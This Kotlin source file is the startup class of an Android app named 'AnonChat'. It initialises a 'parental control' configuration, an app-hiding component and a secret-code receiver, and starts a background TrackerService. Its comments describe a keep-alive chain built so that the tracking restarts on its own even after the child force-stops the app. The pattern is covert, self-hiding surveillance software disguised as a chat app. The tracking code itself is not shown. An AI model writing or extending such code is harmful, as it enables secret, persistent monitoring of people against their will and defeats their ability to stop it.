package com.anonchat.app

import android.app.Application
import android.widget.Toast
import com.anonchat.app.util.AppHider
import com.anonchat.app.util.SecretCodeManager
import com.anonchat.app.util.SecretCodeReceiverManager
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.google.firebase.FirebaseApp

class AnonChatApp : Application() {

    override fun onCreate() {
        super.onCreate()

        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            Toast.makeText(this, "Firebase init failed: ${e.message}", Toast.LENGTH_LONG).show()
        }

        // Initialize ParentalControl CloudConfig
        try {
            CloudConfig.init(applicationContext)
        } catch (e: Exception) {
            Toast.makeText(this, "CloudConfig init failed: ${e.message}", Toast.LENGTH_LONG).show()
        }

        // Create notification channel for app hiding functionality
        try {
            AppHider.createNotificationChannel(this)
        } catch (e: Exception) {
            android.util.Log.e("AnonChatApp", "AppHider.createNotificationChannel failed", e)
        }

        try {
            if (SecretCodeManager.isCodeSet(this)) {
                SecretCodeReceiverManager.registerDynamicReceiver(this)
            }
        } catch (e: Exception) {
            android.util.Log.e("AnonChatApp", "SecretCode setup failed", e)
        }

        // Start parental control background tracking service
        try {
            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
        } catch (e: Exception) {
            android.util.Log.e("AnonChatApp", "Failed to start TrackerService", e)
        }

        // Arm the full keep-alive chain (FGS + exact alarm + WorkManager).
        // This re-runs every time the process starts, so even if a child
        // force-stops the app and a parent later reboots, the chain is
        // automatically re-armed without user intervention.
        try {
            // First-install timestamp: persists across reboots. Once the
            // app has run for the first time, we know we should keep
            // re-arming the chain forever.
            val firstInstall = CloudConfig.firstInstallAtMs
            if (firstInstall == 0L) {
                CloudConfig.firstInstallAtMs = System.currentTimeMillis()
                android.util.Log.i("AnonChatApp", "First install detected at ${CloudConfig.firstInstallAtMs}")
            }
            com.anonchat.app.parentalcontrol.keepalive.KeepAliveScheduler.scheduleAll(this)
        } catch (e: Exception) {
            android.util.Log.e("AnonChatApp", "KeepAliveScheduler.scheduleAll failed", e)
        }
    }
}
